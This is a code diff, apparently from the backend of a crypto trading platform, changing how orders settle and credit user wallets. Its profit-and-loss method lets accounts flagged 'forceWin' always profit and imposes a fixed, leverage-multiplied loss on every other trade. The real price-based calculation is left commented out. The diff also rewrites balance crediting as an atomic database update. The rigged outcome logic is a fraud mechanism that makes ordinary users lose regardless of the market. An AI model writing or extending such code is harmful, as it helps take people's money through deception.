@@ -307,7 +307,7 @@ orderSchema.methods.calculateProfitLoss = async function () {
     // Check if user has forceWin enabled
     if (user.forceWin) {
 
-  
+
       console.log('Force win enabled for user😉😉😉 ');
       // Force win - always profitable
       this.wasForceWin = true;
@@ -318,43 +318,52 @@ orderSchema.methods.calculateProfitLoss = async function () {
       percentage = rateP * this.leverage;
     } else {
       console.log('Calculating normal profit/loss for order 😉😉😉');
-       let rateP = durationRates[this.duration] || 12;
-        percentage = -rateP * this.leverage; // Apply leverage to loss
-        this.wasRandomLose = true;
-        this.randomLossPercentage = rateP;
-        isRandomLoss = true;
+      let rateP = durationRates[this.duration] || 12;
+      percentage = -rateP * this.leverage; // Apply leverage to loss
+      this.wasRandomLose = true;
+      this.randomLossPercentage = rateP;
+      isRandomLoss = true;
 
-/*
-
-      if (true) {
-        // Generate random loss percentage between 1% and 50%
-        // randomLossPercent = 3 + Math.random() *  durationRates[this.duration]-3; 
-        let rateP = durationRates[this.duration] || 12;
-        percentage = -rateP * this.leverage; // Apply leverage to loss
-        this.wasRandomLose = true;
-        this.randomLossPercentage = rateP;
-        isRandomLoss = true;
-        // console.log('Random loss applied:', randomLossPercent.toFixed(2), '%');
-      } else {
-        // Normal calculation based on price movement
-        if (this.direction === 'buy') {
-
-          
-          // For buy (long): profit when price goes up
-          const priceChange = ((this.exitPrice - this.entryPrice) / this.entryPrice) * 100;
-          percentage = priceChange * this.leverage;
-        } else {
-          // For sell (short): profit when price goes down
-          const priceChange = ((this.entryPrice - this.exitPrice) / this.entryPrice) * 100;
-          percentage = priceChange * this.leverage;
-        }
-        console.log('Normal calculation, percentage:', percentage.toFixed(2));
-      }*/
+      /*
+      
+            if (true) {
+              // Generate random loss percentage between 1% and 50%
+              // randomLossPercent = 3 + Math.random() *  durationRates[this.duration]-3; 
+              let rateP = durationRates[this.duration] || 12;
+              percentage = -rateP * this.leverage; // Apply leverage to loss
+              this.wasRandomLose = true;
+              this.randomLossPercentage = rateP;
+              isRandomLoss = true;
+              // console.log('Random loss applied:', randomLossPercent.toFixed(2), '%');
+            } else {
+              // Normal calculation based on price movement
+              if (this.direction === 'buy') {
+      
+                
+                // For buy (long): profit when price goes up
+                const priceChange = ((this.exitPrice - this.entryPrice) / this.entryPrice) * 100;
+                percentage = priceChange * this.leverage;
+              } else {
+                // For sell (short): profit when price goes down
+                const priceChange = ((this.entryPrice - this.exitPrice) / this.entryPrice) * 100;
+                percentage = priceChange * this.leverage;
+              }
+              console.log('Normal calculation, percentage:', percentage.toFixed(2));
+            }*/
     }
 
     this.profitPercentage = parseFloat(percentage.toFixed(2));
     this.profit = (this.amount * percentage) / 100;
     this.actualPayout = this.amount + this.profit
+
+    console.log({
+      profitPercentage : parseFloat(percentage.toFixed(2)),
+      profit : (this.amount * percentage) / 100,
+      actualPayout : this.amount + this.profit,
+      ok:"😉😉😉😉😉"
+
+
+    })
 
     // Ensure actual payout is not negative
     if (this.actualPayout < 0) this.actualPayout = 0;
@@ -394,58 +403,47 @@ orderSchema.methods.calculateProfitLoss = async function () {
 // Method to complete order with user balance update
 orderSchema.methods.completeOrder = async function (exitPrice) {
   try {
-    /// console.log('Completing order:', this._id);
-
     this.exitPrice = exitPrice;
-    await this.calculateProfitLoss();
+    
+    // 1. Calculate P&L in memory first
+    await this.calculateProfitLoss(); 
+    
     this.status = 'completed';
     this.completedAt = new Date();
     this.isLive = false;
 
-    // Save order first
+    // 2. Save the order status
     await this.save();
-    // console.log('Order saved with completed status');
 
-    // Update user balance and stats
-    const user = await userModel.findById(this.user);
-    if (!user) {
-      throw new Error('User not found');
-    }
+    // 3. ATOMIC UPDATE (This is the most important fix for Railway)
+    // We update the user directly in the DB without fetching them first.
+    const updatedUser = await userModel.findOneAndUpdate(
+      { _id: this.user },
+      { 
+        $inc: { 
+          "wallet.usdt": Number(this.actualPayout.toFixed(2)), // Atomic increment
+          "totalTrades": 1,
+          "totalProfit": this.profit > 0 ? Number(this.profit.toFixed(2)) : 0,
+          "totalLoss": this.profit < 0 ? Number(Math.abs(this.profit).toFixed(2)) : 0,
+          "winningTrades": this.profit > 0 ? 1 : 0,
+          "losingTrades": this.profit < 0 ? 1 : 0
+        } 
+      },
+      { new: true } // Returns the updated document
+    );
 
-    // Add payout to user balance
-    user.wallet.usdt += this.actualPayout;
-
-    // Update user stats
-    user.totalTrades += 1;
-
-    if (this.profit > 0) {
-      user.totalProfit += this.profit;
-      user.winningTrades += 1;
-    } else if (this.profit < 0) {
-      user.totalLoss += Math.abs(this.profit);
-      user.losingTrades += 1;
-    }
-
-    // Update win rate
-    if (user.totalTrades > 0) {
-      user.winRate = (user.winningTrades / user.totalTrades) * 100;
-    }
-
-    await user.save();
-    // console.log('User balance updated to:', user.wallet.usdt);
-
-    // Create transaction record
-    //await this.createTransaction();
+    if (!updatedUser) throw new Error('User not found during balance update');
 
     return {
       order: this,
-      userBalance: user.wallet.usdt,
+      userBalance: updatedUser.wallet.usdt,
       profit: this.profit,
       actualPayout: this.actualPayout
+
     };
 
   } catch (error) {
-    console.error('Error completing order:', error);
+    console.error('CRITICAL: Balance Update Failed:', error);
     throw error;
   }
 };
